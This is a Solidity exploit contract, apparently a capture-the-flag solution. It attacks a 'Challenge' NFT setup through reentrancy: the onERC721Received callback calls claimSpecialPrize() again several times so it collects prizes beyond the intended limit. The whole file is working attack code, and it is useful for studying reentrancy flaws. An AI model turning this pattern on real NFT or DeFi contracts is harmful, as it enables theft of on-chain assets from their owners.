// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "./AboveNFT.sol";
import "./BeyondNFT.sol";
import "./Challenge.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Exploit is IERC721Receiver {
    Challenge target;
    BeyondNFT beyond;
    AboveNFT above;
    uint256 mySupply;

    event Log(string message, uint256 val);

    constructor(address _target) payable {
        target =  Challenge(_target);
        beyond = BeyondNFT(address(target.beyond()));
        above = AboveNFT(address(target.above()));
        mySupply = 0;

        beyond.mint{value: 1 ether}();
    }

    function attack() public {
        claim();
        require(target.isSolved(), "Challenge not solved");
    }

    function claim() internal {
        beyond.claimSpecialPrize();
    }

    function transfer(uint256 tokenId) internal {
        above.safeTransferFrom(address(this), target.PLAYER(), tokenId);
        require(above.ownerOf(tokenId) == target.PLAYER());
        mySupply++;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        transfer(tokenId);
        if (mySupply <= 5) {
            claim();
        }
        return this.onERC721Received.selector;
    }
}
